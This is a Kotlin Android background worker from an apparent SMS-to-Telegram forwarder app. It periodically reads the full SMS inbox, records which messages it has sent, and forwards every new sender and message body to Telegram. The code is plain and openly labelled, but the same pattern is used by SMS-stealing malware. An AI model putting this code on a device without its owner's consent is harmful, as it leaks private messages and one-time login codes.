package com.smsforwarder.telegram

import android.content.Context
import android.net.Uri
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters

class SmsChecker(context: Context, params: WorkerParameters) : Worker(context, params) {
    companion object {
        private const val TAG = "SmsChecker"
        private const val PREFS_NAME = "SmsForwarderPrefs"
        private const val SENT_IDS_KEY = "sent_sms_ids"
    }

    override fun doWork(): Result {
        Log.d(TAG, "Starting periodic SMS check")

        val config = ConfigReader.readConfig()
        if (config == null) {
            Log.e(TAG, "Config not available, skipping SMS check")
            return Result.success()
        }

        val unsentMessages = getUnsentMessages()
        if (unsentMessages.isEmpty()) {
            Log.d(TAG, "No unsent messages found")
            return Result.success()
        }

        Log.d(TAG, "Found ${unsentMessages.size} unsent messages")

        for ((smsId, sender, body) in unsentMessages) {
            if (TelegramSender.sendMessage(config, sender, body)) {
                markSmsSent(smsId)
                Log.d(TAG, "SMS forwarded successfully: $smsId")
            }
            Thread.sleep(2000)
        }

        return Result.success()
    }

    private fun getUnsentMessages(): List<Triple<String, String, String>> {
        val unsentMessages = mutableListOf<Triple<String, String, String>>()

        try {
            val uri = Uri.parse("content://sms/inbox")
            val projection = arrayOf("_id", "address", "body", "date")
            val cursor = applicationContext.contentResolver.query(
                uri, projection, null, null, "date DESC"
            )

            cursor?.use {
                val idIndex = it.getColumnIndexOrThrow("_id")
                val addressIndex = it.getColumnIndexOrThrow("address")
                val bodyIndex = it.getColumnIndexOrThrow("body")
                val dateIndex = it.getColumnIndexOrThrow("date")

                while (it.moveToNext()) {
                    val id = it.getString(idIndex)
                    val address = it.getString(addressIndex) ?: "Unknown"
                    val body = it.getString(bodyIndex) ?: ""
                    val date = it.getLong(dateIndex)
                    val smsId = "${address}_${date}"

                    if (!isSmsSent(smsId)) {
                        unsentMessages.add(Triple(smsId, address, body))
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading SMS inbox: ${e.message}")
        }

        return unsentMessages
    }

    private fun isSmsSent(smsId: String): Boolean {
        val prefs = applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val sentIds = prefs.getStringSet(SENT_IDS_KEY, emptySet()) ?: emptySet()
        return sentIds.contains(smsId)
    }

    private fun markSmsSent(smsId: String) {
        val prefs = applicationContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val sentIds = prefs.getStringSet(SENT_IDS_KEY, emptySet())?.toMutableSet() ?: mutableSetOf()
        sentIds.add(smsId)
        prefs.edit().putStringSet(SENT_IDS_KEY, sentIds).apply()
    }
}
